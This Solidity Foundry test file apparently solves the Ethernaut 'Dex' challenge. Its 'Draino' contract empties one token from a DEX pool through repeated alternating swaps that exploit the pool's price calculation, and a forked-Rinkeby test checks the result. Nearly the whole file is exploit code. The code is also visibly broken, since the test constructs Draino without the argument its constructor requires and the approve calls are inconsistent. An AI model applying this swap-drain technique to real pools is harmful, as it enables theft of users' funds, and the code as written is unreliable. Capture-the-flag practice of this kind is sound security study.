// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/Dex.sol";
import "forge-std/Test.sol";

contract DexTest is Test {

    uint256 rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function testCreateDraino() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(),rinkebyFork);

        Draino draino = new Draino();
        draino.drain();

        uint tokenBalance1 = draino.checkBalance1();
        uint tokenBalance2 = draino.checkBalance2();
        assertTrue(tokenBalance1 == 0 || tokenBalance2 == 0);
    }
}

contract Draino {

    address public token1;
    address public token2;
    address private hacker;
    Dex dex;

    constructor(address $your_ethernaut_instance_here) {
        dex = Dex($your_ethernaut_instance_here);
        token1 = dex.token1();
        token2 = dex.token2();
        hacker = msg.sender;
    }

    function drain() public {
        // approve this contract to spend both of user's initial 10tokens
        SwappableToken a = SwappableToken(token1);
        SwappableToken b = SwappableToken(token2);
        a.approve(hacker, address(this), (2**256 - 1));
        b.approve(hacker, address(this), (2**256 - 1));

        // send 10token1 to dex to initialize unexpected contract liquidity imbalance
        IERC20(token1).transferFrom(hacker, address(dex), 10);
        // obtain 10token2 liquidity from hacker to start exploit
        IERC20(token2).transferFrom(hacker, address(this), 10);

        while (dex.balanceOf(token1, address(dex)) > 0 && dex.balanceOf(token2, address(dex)) > 0) {
            uint balance = dex.balanceOf(token1, address(this));

            // alternate swap in other direction
            if (balance == 0) { 
                balance = dex.balanceOf(token2, address(this));
                
                // set allowance for dex in from to msg.sender
                b.approve(address(this), address(dex), balance);

                // catch issue where swapAmount is set to 245, more than the dex pool holds!
                if (dex.getSwapPrice(token2, token1, balance) > 110) {
                    balance = 34;
                    dex.swap(token2, token1, balance);
                } else {
                    dex.swap(token2, token1, balance);
                }
            } else {
                a.approve(address(dex), balance);

                // catch same swapAmount == 245 issue in reverse direction
                if (dex.getSwapPrice(token1, token2, balance) > 110) {
                    balance = 34;
                    dex.swap(token1, token2, balance);
                } else {
                    dex.swap(token1, token2, balance);
                }
            }
        }
    }

    function checkBalance1() public view returns (uint) {
        return (dex.balanceOf(token1, address(dex)));
    }

    function checkBalance2() public view returns (uint) {
        return (dex.balanceOf(token2, address(dex)));
    }
}